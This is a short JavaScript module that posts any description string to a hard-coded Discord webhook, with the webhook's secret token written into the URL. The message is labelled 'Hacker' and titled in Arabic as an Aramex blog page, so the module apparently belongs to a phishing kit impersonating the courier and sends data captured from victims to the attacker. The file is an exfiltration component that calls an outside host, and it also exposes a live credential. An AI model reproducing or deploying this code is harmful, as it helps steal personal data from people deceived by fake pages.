import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326949192257503405/ZFhAOYP1g_YWHYt7AbQ7Rz9iabF3Ge4Aq6YGiM8L-GzlQhYUOUdjxzpKZ1WJIZ8IoXRA",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
